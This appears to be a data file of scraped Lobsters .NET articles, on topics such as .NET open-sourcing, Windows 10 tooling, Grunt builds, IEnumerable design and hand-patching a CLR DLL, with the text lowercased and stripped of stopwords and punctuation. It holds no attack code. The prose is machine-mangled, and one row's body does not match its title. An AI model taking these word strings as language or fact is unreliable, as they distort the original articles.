desktop server cloud instance within reach huge step forward c net represents remarkable advance microsoft remaking embrace future andrew binstock editor chief email protected twitter platypusguy google
595,Lobsters,dotnet,"C#, F#, .NET programming",The Future of .NET,http://developer.telerik.com/featured/future-net/,future net,open source os net go open source connect announced mit license clr jit gc grab source code connect foot view net goody roslyn net native ryujit net foundation build scott guthrie home page os project crossplatform apache cordova aspnet vnext aspnet open source net server kruntime version package tooling improvement build aspnet application natively mac sublime text tag helper tooling visual studio community edition ahead window tech preview roadmap tooling improvement telerik control suite devcraft conclusion,net developer sure hearing lot buzz lately may feel little befuddled going major change bring initial uncertainty hesitancy normal however allow prove one best time net developer fluff developertodeveloper breakdown store future net awesome think glad part open source probably aware open source software os mean software source code available publicly usable studychangedistribute variety license constraint one fundamental trait os often developed collaborative manner thus leveraging continuous feedback nt like something pull source code make change fit need os benefit tremendously developer community involvement meaningful change accepted back primary source code thus made available user project forked creating entirely new offshoot may believe managing os tricky often marketing gimmick true managing open source project present new challenge company cynically open sourced project wholeheartedly buying spirit open source software also enterprise need consider legal implication os development stack however believe overall benefit open source far outweigh anything else net go open source nov marked day monumental shift microsoft development stack connect event nyc announced core beloved net framework entirely open sourced usable mit license include everything needed execute net code including common language runtime clr justintime compiler jit garbage collector gc core net base class library let embrace openness grab source code use build fork microsoft committed accepting meaningful community contribution assured quality net base class every net developer encouraged check keynote breakout session available demand connect website good stuff foot view image courtesy microsoft representation net vnext depicts framework moving forward familiar different time fundamentally role usage net changing offer increased flexibility net used behemoth serving desktop web mobile app development server installation equal footing moving forward net much specialized serving cloud device server optimization powering net common set feature runtime compiler base library get pick choose exactly want use waiting elaborate process upgrade net framework server well roll net framework selfcontained apps multiple version sidebyside net goody net framework vnext pack punch come new language compiler level enhancement starter roslyn net compiler platform roslyn allows innovative c vb compilation cloud load benefit inside ides like visual studio well third party integration window store apps benefit net native aheadoftime compilation result significant performance improvement quicker app start time lower memory footprint desktop server apps benefit next generation ryujit time compiler goodness net spreading application type leading convergence development experience net foundation back build conference scott guthrie announced net foundation quoting home page net foundation created independent forum foster open development collaboration around growing collection open source technology net foundation since garnered lot support host impressive array os project microsoft supporting partner serf de facto steward open source repository net crossplatform live silo window nt thing world mindset change within microsoft evident next net framework official distribution net available linux o x want repeat let sink big deal crossplatform developer welcome use net framework platform choice web desktop cloud mobile development almost platform targeted net framework build native aspnet web application mac build native io android application using c along window counterpart build hybrid singlecodebase crossplatform mobile apps using plain htmlcssjs apache cordova open source framework huge welcome change potentially spread use net nonmicrosoft developer aspnet vnext perhaps biggest shift mindset evident next aspnet nt fret though offering flexibility let explain point per trend aspnet vnext entirely open source available net foundation need insider access anymore go look source code build change pull fork aspnet vnext see convergence several framework unified programming model mvc includes latest mvc webpage web api signalr entity framework single controller return mvc view formatted web api response http verb aspnet completely modular pick piece need get nuget future net server look interesting say least brand new http processing pipeline terrific throughput new kruntime core aspnet vnext come builtin version package manager along load tooling aspnet application hosted ii outside process yes run mono mac linux lot tooling improvement aspnet visual studio also build aspnet application natively mac simply use command line interface cli tool like sublime text web form live healthy let nobody tell dying instead using modular net framework simply use whole like old time tool extension web form still carry forward aspnet vnext cloud ready feature like session state caching provide consistent apis adjust behavior well suited cloud hosting versus traditional server dependency injection rampant within aspnet plug play heart desire skip build step simply make code change refresh browser see change come courtesy jit compilation roslyn new net compiler platform aspnet mvc syntax get little magical thing called tag helper learn since quite powerful tooling lot tooling improvement net developer inside visual studio big news brand new visual studio sku trump everything else remember v express edition free sure could develop one type application specific v express edition new visual studio community edition one sku rule yes free develop type net application web cloud desktop mobile fullfeatured ide integrated development environment support advanced feature like plugins extension ahead lot microsoft focusing convergence operating system o developer platform net best bet window represents next generation o thing used running window namely desktop laptop phone internet thing embedded device window tech preview already window universal apps best bet going forward application stack technology used net past move forward simply choose modular complete net framework based need check recently published roadmap tooling improvement wpf met much fanfare net development community telerik control suite net developer always loved telerik control provide idea scale telerik devcraft bundle includes net tooling used million developer lot love honored net evolves next generation find u adopting best feature making performance enhancement innovating specialized control platform well building alreadypresent crossplatform story major product stand right away net vnext help build awesome uis next generation net application conclusion know long read hope convinced future net development looking awesome let embrace change gear flexible better tomorrow best inclass tooling open source crossplatform approach building next generation amazing apps platform net let go code
597,Lobsters,dotnet,"C#, F#, .NET programming",Microsoft Open Sources .NET and Mono,http://tirania.org/blog/archive/2014/Nov-12.html,microsoft open source net mono,mit license patent promise net foundation github net component net framework class library http githubcommicrosoftreferencesource net core http githubcomdotnetcorefx next step,today scott guthrie announced microsoft open sourcing net momentous occasion one advocated many year net open sourced mit license code released permissive license microsoft providing patent promise ensure net get adoption deserves code hosted net foundation github repository patent promise address historical concern open source unix free software community raised year net component three component open sourced net framework library net core framework library ryujit vm detail net framework class library class library power net framework ship window one mono historically implemented open source fashion code available today http githubcommicrosoftreferencesource mono able use much want project project underway already replacing chunk mono code either incomplete buggy fully featured microsoft code checking code githubcommono end week currently ny celebrating microsoft stated currently plan taking patch back engaging full open source community style development code base requirement backwards compatibility window high net core net core redesigned version net based simplified version class library well design allows net incorporated application familiar pcl contract assembly good idea assembly look like effort hosted http githubcomdotnetcorefx effort microsoft fully engage community evolve develop improve class library today released first component github plan rest redesigned framework checked next month xamarin mono project contributing effort bring net mac unix linux platform microsoft open source piece net core including ryujit next step like past net code microsoft open sourced like roslyn going integrating code mono xamarin product later week expect updated version mono project roadmap list task need completed integrate microsoft net framework code mono longer term make mono virtual machine support new net core deployment model well new vmclass library interface going moving net core discussion net foundation forum mono project spent year working open source net microsoft release net issue patent covenant ensure cooperate build vibrant richer larger net community
598,Lobsters,dotnet,"C#, F#, .NET programming",Windows 10 - What's In It for Developers?,http://developer.telerik.com/featured/windows-10-whats-developers/,window developer,technical preview package manager built oneget powerful new console site console improvement productive desktop mode got better task manager multipledesktop support stay bleeding edge window end day window universal apps wpf web apps blog post,window unveiled september technical preview individual signed become window insider since release seen lot coverage medium outlet regarding new feature endusers excited little coverage developer post going point several thing caught eye developer work daily microsoft stack please note using build article package manager built developer grown love package manager inside ides install framework library etc also enjoy o package manager quickly find install thirdparty application window developer finally get one oneget package manager included window allows install additional software powershell command line simply open powershell window type following command installpackage name firefox using window technical preview see following screen shown figure want read blog post detail command oneget offer figure installing firefox powershell command line window technical preview powerful new console every developer looking way enhance productivity especially using window console window technical preview turn enable experimental console feature rightclicking command prompt going property find experimental tab turn shown figure figure new command prompt property enable experimental feature besides ability use control key copy paste text console come several feature selfexplanatory example changed opacity see background coming click link bottom property page navigate site allows provide feedback well comprehensive list console improvement window yes feature new console copy paste productive desktop mode got developer one thing used switching desktop mode modern apps mode think safe assume developer use window stay desktop mode majority day productive visual studio expression blend microsoft office life may occasionally switch back modern app mode run window apps search shutdown pc rare least window change signed user turn pc pin modern apps start menu much without ever leaving desktop window also continuum mode smart enough determine using surface laptop launch either desktop mode modern app mode automatically using surface attach keyboard automatically go desktop mode remove see modern app mode figure show new start button look like window figure modern apps run desktop pinned start button also ability search everywhere local machine even internet something play major role created modern app discovered start button imagine need tip calculator type tip calculator box search local machine one ca nt find one give bing search result along suggested app window store help modern app launched given several option shown figure previously available via share charm figure modern app option available without share charm menu accessed mouse time writing sure keyboard shortcut window ship better task manager exactly new window better task manager evolved many time wanted easy way disable application automatically startup learn information program actually detailed information startup impact application developer invested latest hardware nt want app slow system suspicious program might virus thankfully take care issue task manager shown figure figure new improved task manager multipledesktop support last feature found extremely helpful multipledesktop support imagine want multiple desktop configured certain apps etc able toggle needed window technical preview easy shown figure figure multipledesktop support added window simply click task view click create desktop place application needed use keyboard shortcut winkey ctrl left arrow winkey ctrl right arrow toggle desktop even move window another desktop rightclick move select desktop choice stay bleeding edge window like developer love staying bleeding edge technology window technical preview build contains way always latest build mouse click go pc setting click update recovery switch preview build fast instead slow shown figure figure preview build changed fast window end day even though window technical preview net developer still write code know love new o thankfully telerik solution window universal apps span phone tablet desktop wpf web apps ready implement today feature shown article may may make final cut betting majority feature missing developer love sound comment may create second post calling feature learn universal apps offering please check blog post header image courtesy
599,Lobsters,dotnet,"C#, F#, .NET programming",mBaaS Isn't Just for JavaScript,http://developer.telerik.com/featured/mbaas-isnt-just-javascript-visual-studio-telerik-data-storage/,mbaas nt javascript,challenge partnership community deliver expected,challenge demand better user experience continues grow time develop high quality modern engaging application continues shrink stop sweating ui focus part application truly make differencepartnership community like developer purpose life make developer superheroes enabling deliver expected faster expected nearly two decade partnering community two million developer help cut development time increase productivity make easy embrace latest technology user experience trendsdeliver expected using modern featurerich professionally designed ui component telerik kendo ui armed everything need deliver outstanding web mobile desktop experience le timewith backing legendary technical support provided directly developer build product confident best partner rely journey
601,Lobsters,dotnet,"C#, F#, .NET programming",Grunt and Uglify Your WebForms with Task Runner Explorer,http://developer.telerik.com/featured/grunt-uglify-webforms-task-runner-explorer/,grunt uglify webforms task runner explorer,scriptmanager bundling minification minify task runner explorer default configuration aspnet script manager improving default hiding dlls installed project scriptmanagerproxy control hand taking control grunt uglify task runner explorer nodejsorg breaking gruntfile running grunt automatically connecting dot summary,year registering script serving scriptmanager aspnet web form recent year bundling minification added toolbox use together scriptmanager deliver complete javascript experience today web delivering javascript cs httphandler end axd nt standard practice fact developer would much rather concatenate minify script deployment time introduction task runner explorer visual studio microsoft provided tool enables workflow default configuration aspnet script manager default new aspnet application scriptmanager configured sitemaster file following content asp scriptmanager runat server id scriptmgr script framework script asp scriptreference name msajaxbundle asp scriptreference name webformsbundle asp scriptreference name jquery asp scriptreference name bootstrap asp scriptreference name respond asp scriptreference name webformsjs assembly systemweb path scriptswebformswebformsjs asp scriptreference name webuivalidationjs assembly systemweb path scriptswebformswebuivalidationjs asp scriptreference name menustandardsjs assembly systemweb path scriptswebformsmenustandardsjs asp scriptreference name gridviewjs assembly systemweb path scriptswebformsgridviewjs asp scriptreference name detailsviewjs assembly systemweb path scriptswebformsdetailsviewjs asp scriptreference name treeviewjs assembly systemweb path scriptswebformstreeviewjs asp scriptreference name webpartsjs assembly systemweb path scriptswebformswebpartsjs asp scriptreference name focusjs assembly systemweb path scriptswebformsfocusjs site script script asp scriptmanager script rendered html aspnet runtime following script src bundlesmsajaxjs type textjavascript script script src bundleswebformsjs type textjavascript script script src type textjavascript script script src scriptsbootstrapminjs type textjavascript script script src scriptsrespondminjs type textjavascript script delivered size listed total five file downloaded improving default top scriptmanager reference bundled script defined appstartbundleconfigcs hiding dlls installed project webformsbundle individual script file defined actually duplicate ensure appropriate script loaded page scriptmanager dedupes collection render time however jquery bootstrap respond script combined served three additional downloads first time ran wondered optimized site running release mode scriptmanager server minjs version file never need debug always combine force scriptmanager combine adding element inside scriptmanager moving reference compositescript script asp scriptreference name jquery asp scriptreference name bootstrap asp scriptreference name respond script compositescript change script rendered scriptmanager html look like script src scriptresourceaxd type textjavascript script script src bundlesmsajaxjs type textjavascript script script src bundleswebformsjs vaayiaywmcodemeananything type textjavascript script alright talking define similar composite script element scriptmanagerproxy control child page file bundled minified resultant file downloaded following size three file total also note scriptmanager gzipped scriptresourceaxd payload delivered need web server take care hand taking control grunt uglify doityourself kinda guy fond aspnet handle packaging minifying file would rather static file available web server compress cache deliver long expiration time modern web way invoke task runner process file part build process microsoft new task runner explorer facilitates process project insert link static file javascript cs nt used tool like grunt node follow step install prerequisite tool need start new workflow install nodejs nodejsorg install grunt commandlineinterface cli command command prompt npm install g gruntcli create packagejson file root web application following content name project name version dependency devdependencies grunt gruntcontribconcat gruntcontribuglify gruntcontribcssmin file define library necessary build javascript cs project gruntcontribconcat concatenate file together gruntcontribuglify minify javascript file stripping comment space renaming variable short string gruntcontribcssmin minify cs file using similar technique uglify process build gruntfilejs root web project initial content following moduleexports function grunt use strict project configuration gruntinitconfig metadata pkg gruntfilereadjson packagejson banner lt pkgname v lt pkgversion lt grunttemplatetoday yyyymmdd n plugins provide necessary task gruntloadnpmtasks gruntcontribconcat gruntloadnpmtasks gruntcontribuglify gruntloadnpmtasks gruntcontribcssmin default task gruntregistertask default concat uglify cssmin customize gruntfile meet project need breaking gruntfile lot get started let break content gruntfilejs first grunt object configuration intialized initconfig function inside metadata around package loaded pkg variable banner created text formatting look eerily similar aspnet tag next task loaded concat uglify cssmin finally task called default registered call concat uglify cssmin order complete gruntfile need define concat uglify cssmin task operate banner definition let define concat task banner pkgname v pkgversion grunttemplatetoday yyyymmdd n task configuration concat option stripbanners true dist src scriptsjquery j scriptsjquery min scriptsjquery intellisense scriptsbootstrapjs scriptsrespondjs j j dest distappjs distcss src contentbootstrapcss contentsitecss dest distappcss inside task option set remove banner file concatenating define subtasks dist distcss dist subtask collect file match array file filter passed excluding file matching filter start exclamation point file merged placed distappjs thing cs file placing distappcss next uglify javascript file need add task concat syntax look like following uglify option banner banner compress dropconsole true dist src concatdistdest dest distappminjs block easy read option defined add banner top file drop call console contained within script analyzed one subtask called dist analyze file written dest location concat task dist step result written distappminjs last task configure cssmin task look similar uglify task except provide option one cssmin dist src concatdistcssdest dest distappmincss like uglify step analyze output concat task distcss step write output distappmincss file running grunt automatically next fun part opened task runner explorer view window task runner explorer see doubleclick task left run task really want run default task build completes enable rightclick default task left panel select binding build instruct visual studio run grunt task project build connecting dot finally added new file default master page used everywhere link rel stylesheet type textcss href resolveurl distappmincss asp scriptmanager runat server id scriptmgr script site script asp scriptreference path distappminjs scriptmode release script asp scriptmanager marked appminjs file release mode scriptmanager nt try derive filename nt exist summary article showed add javascript tool grunt workflow addition task runner explorer visual studio generate file fly build application task would want visual studio run grunt let know comment
602,Lobsters,dotnet,"C#, F#, .NET programming",Rethinking IEnumerable<T>,http://blog.paranoidcoding.com/2014/08/19/rethinking-enumerable.html,rethinking ienumerable,extra overhead,net enumeration story based ienumerable succesful pattern backbone many different language framework feature including foreach linq iterators etc yet switching c c often frustrated inefficiencs quirk accessing single value requires interface invocation movenext current interface method invocation extra overhead associated pay price twice instead using single method call force allocation ienumerable value heap even enumerator could implemented struct allocation net cheap free frustrating one core path legacy pregenerics net force type safe collection eventually implement nongeneric ienumerable ienumerator even idisposable remember last time actually used one yet write boiler plate code every time author new collection many collection like list implement pattern based enumeration part avoid inefficiency code write test maintain yet really add new feature time also complicates ability developer understand mechanism behind given foreach block recently experiment decided sit explore new design ienumerable addressed issue particular following goal use single method call advance enumeration access next value use strongly typed generic force allocation enumerator type single code path enumeration dispose legacy baggage tinkering settled following design public interface ienumerable telement tenumerator tenumerator start get bool trygetnext ref tenumerator enumerator telement value visible change elimination ienumerator favor enumerator type parameter eliminates forced allocation enumerator allows type like list use natural enumerator type like int real advantage pattern greatly simplifies code necessary implement enumerable class mylist ienumerable int array public int start get return public bool trygetnext ref int index value index count value default return false value array index return true implementation free boiler plate code necessary implement net ienumerable instead focus actual code necessary enumerate value full example net enumeration included bottom post code difference staggering code generation foreach new pattern following void telement tenumerator ienumerable telement tenumerator enumerable developer type foreach telement current enumerable loop body compiler emits telement current tenumerator e enumerablestart enumerabletrygetnext ref e current loop body enumeration pattern mylist consistent matter context enumerated mylist ienumerable enumerator type always int always execute code path enumeration code path test downside approach make consumption enumeration generic complicated method type require type parameter instead advanced developer significant overhead average net developer big increase complexity biggest problem though using practice work existing foreach syntax hence loop needed typed hand actual looping pattern great pattern human dealing would obviously go away first class language construct overall pretty happy design though maybe take stab prototyping roslyn support feature point get foreach problem solved promised mylist implementation net ienumerable would look like line code v new pattern old enumeration pattern class mylist ienumerable array internal struct enumerator ienumerator int index mylist list internal enumerator mylist list list list index public current get return listarray index public void dispose object systemcollectionsienumeratorcurrent get return current public bool movenext index listarraylength index return true return false public void reset index public ienumerator getenumerator return new enumerator systemcollectionsienumerator systemcollectionsienumerablegetenumerator return new enumerator
603,Lobsters,dotnet,"C#, F#, .NET programming",5 Killer Productivity Features in Visual Studio 2013,http://developer.telerik.com/featured/5-features-dont-want-miss-visual-studio-2013/,killer productivity feature visual studio,intellisense databinding resource xaml go definition support xaml debugging window store apps using javascript via dom explorer javascript console setting break point code deployed azure azure sdk jeff fritz ruler guide blend visual studio bonus tip cap thing past visual studio update wait visual studio update new feature window window phone window universal apps data storage solution,regardless whether web desktop mobile development net space using version visual studio sort hopefully using visual studio since backwards compatible visual studio project wanted share several feature benefited day day using latest ide microsoft waiting go ahead download open visual studio give feature shot intellisense databinding resource xaml one requested feature xaml developer already intellisense property method etc time truly game changer let look quick example create new wpf application give name tdnwpfapp follow along example paste following xaml mainwindowxaml file window x class tdnwpfappmainwindow xmlns http xmlns x http xmlns local clrnamespace tdnwpfapp title mainwindow height width windowdatacontext local attendee windowdatacontext stackpanel verticalalignment center horizontalalignment center textblock fontsize text binding pathstudentname stackpanel window example creating datacontext map class create shortly called attendee access text property textblock bind property set class go ahead add class called attendee using following codesnippet class attendee public string studentname get set public attendee studentname michael crump class adding one simple property called studentname giving value michael crump inside constructor taking look designer see intellisense working realtime shown figure caption id align aligncenter width figure databinding action xaml caption pay special attention studentname autodiscovered xaml editor go definition support xaml developing app important understand definition particular element whether local system resource reference extension sdks hit rightclick go definition shown figure caption id align aligncenter width figure go definition support xaml variety element caption tired searching specific resource defined work well shown figure caption id align aligncenter width figure go definition finding resource caption debugging window store apps using javascript via dom explorer something new store apps built using javascript ability debug apps using dom inspection tool provided inside visual studio using interactive debugging view modify rendered html cs without stopping restarting debugger figure show example new window store app built using winjs exploring p element could change code say something else modify cs switch back app see change powerful new feature visual studio everyone take advantage access going debug option dom explorer show caption id align aligncenter width figure exploring dom inside window store app built using winjs caption also access javascript consoleas shown figure caption id align aligncenter width figure javascript console caption setting break point code deployed azure new addition visual studio allows ultimate flexibility debugging app starting may want make sure azure sdk installed let take look accomplish first let create mvc application change authentication method none select host cloud website shown figure note already signed azure account caption id align aligncenter width figure mvc wizard visual studio caption next need configure application providing site name region shown figure caption id align aligncenter width figure configure azure website wizard caption switching solution explorer azure website ability right click app created select attach debugger shown figure caption id align aligncenter width figure attaching debugger azure deployed site caption let set break point line page watch magic happen shown figure caption id align aligncenter width figure debugger action caption special thanks colleague jeff fritz passing along awesome feature ruler guide blend visual studio ruler guide allows precisely place element create custom layout window store html xaml wpf window phone apps besides ability create custom layout microsoft provided set guide used box without modification include basicpage fileopenpicker groupdetailpage groupeditemspage hubpage itemspage searchresultspage settingsflyout sharetargetpage splitpage create new window store app use hub template quickly see action shown figure caption id align aligncenter width figure adding guide window store app caption using predefined guide able verify hub app match design guideline m put place application look fantastic device app need custom design simply move ruler match design even save dialog loaded predefined guide bonus tip cap thing past controversial topic since visual studio came basically menu bar cap annoyed many developer microsoft released registry hack included visual studio update toggle editor navigating tool option shown figure caption id align aligncenter width figure upper case toggled ide caption wait touched tip iceberg feature outlined today many included visual studio take advantage also suggest upgrading visual studio update soon possible learn even new feature also looking speed development time window window phone even window universal apps covered ui control data storage solution window store window phone apps
606,Lobsters,dotnet,"C#, F#, .NET programming",Reverse engineering a compromised TOR browser bundle,http://dustri.org/b/torbundlebrowserorg.html,reverse engineering compromised tor browser bundle,snuffleupagus airsonic websecfr nosoignons gpg key,like reversing exploitation privacy mathematics free software defensive security fuzzing sociology among thing dev snuffleupagus exdev airsonic overlord websecfr sysadmin nosoignons dayjob manage largescale opensource software fuzzers get crash fixed make internet bit reliable safe gpg key contact groirtsud tcatnocnisiovneiluj nice day
607,Lobsters,dotnet,"C#, F#, .NET programming",The time I found a CLR bug and fixed it by hand-altering the DLL.,http://blog.nullspace.io/clr-bug.html,time found clr bug fixed handaltering dll,update showed hn comment issue prelude expression tree api problem bart de smet investigation ilspy field property manually patching dll fucking patched binary hand swapped line code comment powered disqus comment powered,update colleague excolleagues net framework team showed hn comment issue worth reading prelude c support kindofmacros via neat expression tree api gist build tree represents c expression want execute expression c basically treat like small dll ie compiles expression tree il clr bytecode link like would dll neat eh take look code sample var exp expression func int int x var result expcompile invoke first line generate expression object represents lambda x second line compile expression il call invoke link new il library run code code produce result problem today built compiled attempted run seemingly normal expression object greeted following mysterious error buried many method call deep systemlinqexpressions namespace part core net code instance field value defined type systemlinqexpressionsinterpreterexplicitbox exception totally undocumented api normally mean slacking documentation bug library exception never meant thrown either case found error completely baffling showed awesome colleague bart de smet puzzled investigation decided seemed bug library since error happened systemlinqexpressionsinterpreter assembly started decompiling whole dll using ilspy look implementation systemlinqinterpreterexplicitbox class causing u problem copied highlighting offending value member benefit notice particular property yet error claim field hmm suspicious decided look member supposed invoked turned systemlinqexpressionsinterpreterquoteinstructionexpressionquoter specifically visitparameter method decompiled ilspy highlighted offending attempt access value property look clearly trying access field called value know last code snippet value unambiguously property code completely wrong wrong since probably proof bug long time value property actually come istrongbox interface ie explicitbox inherits istrongbox see first code snippet since interface field know value always property qed bug found go home right manually patching dll normal people would reported net team done course right hahahahaha course bart finished grumbling accepted going let leave resolved issue sat fucking patched binary hand fuck police started grabbing systemlinqexpressionsdll dll code decompiling il using command ildasm outsystemlinqexpressionsil systemlinqexpressionsdll produced bigass il file opened ctrlf string value including quote imagined would lead u code awful expressionfield thing saw take u line ldstr value call class systemlinqexpressionsmemberexpression systemlinqexpressionsexpression field class systemlinqexpressionsexpression string bingo real fun begin bart grumbled moaned sane person time sane time fix problem basically knew wanted il ended spending lot time compiling sample application get namespaces assembly right could actually write newlyhacked il code also spent time fixing error il code ilasm reported u point though settled following il code ultimately swapped line code nb il address optional ldtoken method instance object systemruntime systemruntimecompilerservicesistrongbox getvalue call class systemreflection systemreflectionmethodbase systemreflection systemreflectionmethodbase getmethodfromhandle valuetype systemruntime systemruntimemethodhandle castclass systemreflection systemreflectionmethodinfo call class systemlinqexpressionsmemberexpression systemlinqexpressionsexpression property class systemlinqexpressionsexpression class systemreflection systemreflectionmethodinfo finally regenerated dll il following command ilasm dll systemlinqexpressionsil redecompile dll ilspy make sure everything look like notice highlighted part point call property instead great expect finally recompiled original project fetched new patched binary gac ie global assembly cache ran code magically worked followed sending world best bug report net native team retire night winner please enable javascript view comment powered disqus comment powered
608,Lobsters,dotnet,"C#, F#, .NET programming",Server Side Responsive Layouts in ASP.NET AJAX,http://developer.telerik.com/featured/server-side-responsive-layouts-asp-net-ajax/,server side responsive layout aspnet ajax,designing responsive web page server side responsive web page introduction radpagelayout page layout control structure container row column supported layout type reducing bandwidth mobile broswers device detection framework conclusion,developing web site one question prevalent today responsive pretty much web developer ask would rate top priority developing modern web site responsive anyway well turn meaning pretty simple responsive web pageapp one capability adapt client device say client device talking three main screen form factor know desktop browser mobile browser tablet browser designing responsive web page first question responsive well two primary way make element web page responsive resize content placeholder hide example assume layout header content two sidebar footer might make sense show part viewed desktop browser mobile tablet browser may hide sidebar resize content typically done client side using cs medium query alter vidual display property html element server side responsive web page cs framework work concept hiding content important emphasize push everything irrespective device content page sent full portion hidden client problem ask well unnecessarily pushing content mobile browser eventually hidden meaning forcing user download byte likely never need send content first place send portion content eventually shown browser cut bandwidth used load content mobile device tablet device control vanilla aspnet ajax control toolkit part ui aspnet ajax product line telerik released brand new control called radpagelayout designed help achieve serverside responsive web page ease let take closer look control introduction radpagelayout radpagelayout simple lightweight serverside control help create page layout based upon intuitive grid system since server side control configure page layout completely server unlike layout system like bootstrap client side grid system two element row column row container column column container content shown let take look radpagelayout action code snippet create simple layout telerik radpagelayout runat server gridtype fluid row telerik layoutrow column telerik layoutcolumn span div class col main content div telerik layoutcolumn telerik layoutcolumn span div class col side bar div telerik layoutcolumn telerik layoutcolumn span div class col side bar div telerik layoutcolumn column telerik layoutrow row telerik radpagelayout created layout would look like screenshot page layout control structure radpagelayout control basically composed thing container row column let take look one closely container outermost element page layout control rendered within default rendered html div element property supported container follows gridtype layout type either static fixed fluid showgrid property used display hide visual grid guide mark property set container telerik radpagelayout id runat server showgrid true gridtype fluid telerik radpagelayout row mentioned earlier row simple container column row represented layoutrow object within markup code snippet show usage row telerik radpagelayout id runat server gridtype fluid row telerik layoutrow content div class header header div content telerik layoutrow row telerik radpagelayout column column structural unit layout design show content need rendered column represented layoutcolumn within markup analogous table cell html world code snippet show usage telerik radpagelayout id runat server row telerik layoutrow column telerik layoutcolumn span main content telerik layoutcolumn telerik layoutcolumn span sidebar telerik layoutcolumn column telerik layoutrow row telerik radpagelayout supported layout type radpagelayout control modelled around gridbased layout system support three layout type fixed layout type used page layout control respond viewport change set grid column width value corresponds current viewport size fluid layout type used page layout control respond fluidly viewport change set height grid row fit available space static name say layout type us grid react viewport change type layout need page set using gridtype property page layout control reducing bandwidth mobile broswers radpagelayout server side control give one great flexibility feature actually control content intend send client based thing like screen size see request came small screen size ie le pixel hide sidebar send main content order detect screen size use framework called device detection framework ddf ddf part ui aspnet ajax product suite includes device detection framework api ddf api inform screen size user making request box ddf includes set default screen size small upto cs pixel medium cs pixel large cs pixel extralarge cs pixel following code snippet illustrates hide content making use device detection framework protected void pageload object sender eventargs e devicescreensize screensize detectorgetscreensize requestuseragent screensize devicescreensizesmall hide sidebar mobile device false false read device detection framework conclusion modern web site must consider responsive design discussed technique responsive design overload user content never see however usage radpagelayout quickly create responsive layout webforms without hassle simple step since service side control program server side response sent client radpagelayout coupled device detection framework help reduce bandwidth serving mobile browser
609,Lobsters,dotnet,"C#, F#, .NET programming",Integrating ASP.NET with a 3rd Party Security Service,http://developer.telerik.com/featured/making-security-work-integrating-asp-net-3rd-party-security-service/,integrating aspnet party security service,challenge partnership community deliver expected,challenge demand better user experience continues grow time develop high quality modern engaging application continues shrink stop sweating ui focus part application truly make differencepartnership community like developer purpose life make developer superheroes enabling deliver expected faster expected nearly two decade partnering community two million developer help cut development time increase productivity make easy embrace latest technology user experience trendsdeliver expected using modern featurerich professionally designed ui component telerik kendo ui armed everything need deliver outstanding web mobile desktop experience le timewith backing legendary technical support provided directly developer build product confident best partner rely journey
612,Lobsters,dotnet,"C#, F#, .NET programming",Railway oriented programming,http://fsharpforfunandprofit.com/posts/recipe-part2/,railway oriented programming,slide video comprehensive presentation available read first designing function represents step railway oriented programming basic composition converting switch twotrack input way writing bind function currying domain modeling made functional book example combining validation function bind piping operation alternative bind bind v switch composition bind switch composition switch composition term bind converting simple function railwayoriented programming model creating twotrack function onetrack function converting deadend function twotrack function handling exception function twotrack input converting single value twotrack value combining function parallel implementation parallel validation dynamic injection function railway track function complete code type v shape generic type powerful failure type download ebookpdf summary guideline reading see applied fizzbuzz slide video domain modeling made functional book recipe functional app series comment comment powered disqus blog comment powered,part recipe functional app series update slide video comprehensive presentation available understand either monad read first previous post saw use case could broken step error shunted onto separate error track like post look various way connecting step function single unit detailed internal design function described later post designing function represents step closer look step example consider validation function would work data go come well two possible case either data valid happy path something wrong case go onto failure path bypass rest step like would valid function function one output must use result type defined last time type result tsuccess tfailure success tsuccess failure tfailure diagram look like show work practice example actual validation function might look like type request name string email string let validateinput input inputname failure name must blank else inputemail failure email must blank else success input happy path look type function compiler deduced take request spit result output request success case string failure case validateinput request result request string analyze step flow way find one sort input successfailure output preemptive apology said function two output may occasionally refer hereafter function course mean shape function output two case railway oriented programming lot input successfailure function connect together want connect success output one input next somehow bypass second function case failure output diagram give general idea great analogy something probably already familiar railway railway switch uk directing train onto different track think function railway switch like two row combine failure track connected obvious like whole series switch end two track system looking something like top track happy path bottom track failure path stepping back looking big picture see series black box function appear straddling twotrack railway function processing data passing track next function look inside function see actually switch inside one shunting bad data onto failure track note get failure path never normally get back onto happy path bypass rest function reach end basic composition discus step function together review composition work imagine standard function black box tunnel say sitting onetrack railway one input one output want connect series onetrack function use lefttoright composition operator symbol composition operation also work twotrack function well constraint composition output type lefthand function match input type righthand function railway analogy mean connect onetrack output onetrack input twotrack output twotrack input directly connect twotrack output onetrack input converting switch twotrack input run problem function step going switch one input track overall flow requires twotrack system function straddling track meaning function must twotrack input result output previous function simple onetrack input request insert switch two track system answer simple create function switch function convert proper twotrack function illustration actual code look like going name adapter function bind standard name let bind switchfunction fun twotrackinput match twotrackinput success switchfunction failure f failure f bind function take switch function parameter return new function new function take twotrack input type result check case input success call switchfunction value input failure switch function bypassed compile look function signature val bind result b c result c result b c one way interpreting signature bind function one parameter switch function result return fully twotrack function result result output even specific parameter switchfunction bind take type emits result type b success track c failure track returned function parameter twotrackinput result type success c failure type switchfunction expecting one track output returned function another result time type b success c failure type switch function output think type signature exactly would expect note function completely generic work switch function type care switchfunction actual type involved way writing bind function aside way writing function like one way use explicit second parameter twotrackinput rather defining internal function like let bind switchfunction twotrackinput match twotrackinput success switchfunction failure f failure f exactly first definition wondering two parameter function exactly one parameter function need read post currying yet another way writing replace match syntax concise function keyword like let bind switchfunction function success switchfunction failure f failure f might see three style code personally prefer use second style let bind switchfunction twotrackinput think explicit parameter make code readable nonexperts like way explaining thing picture take look domain modeling made functional book friendly introduction domain driven design modeling type functional programming example combining validation function write little bit code test concept start already defined request result bind type result tsuccess tfailure success tsuccess failure tfailure type request name string email string let bind switchfunction twotrackinput match twotrackinput success switchfunction failure f failure f next create three validation function function goal combining one bigger function let input inputname failure name must blank else success input let input inputnamelength failure name must longer char else success input let input inputemail failure email must blank else success input combine apply bind validation function create new alternative function twotracked connect twotracked function using standard function composition like glue three validation function together let combinedvalidation convert switch twotrack input let bind let bind connect twotracks together function new function take twotrack input look signature see take result return result note need converted two track input input left onetrack output twotrack already needed composition work diagram showing switch unbound switch together adapter could also bind like let combinedvalidation connect twotracks together bind bind test two bad input good input test let name email combinedvalidation printfn name must blank test let name alice email combinedvalidation printfn email must blank test let name alice email good combinedvalidation printfn name alice email good would encourage try play around validation function test input might wondering way run three validation parallel rather serially get back validation error yes way explain later post bind piping operation discussing bind function common symbol used pipe value switch function definition switch around two parameter make easier chain together create infix operator let twotrackinput switchfunction bind switchfunction twotrackinput one way remember symbol think composition symbol followed twotrack railway symbol used like operator sort like pipe switch function normal pipe left hand side onetrack value right hand value normal function operation left hand side twotrack value right hand value switch function use create another implementation combinedvalidation function let 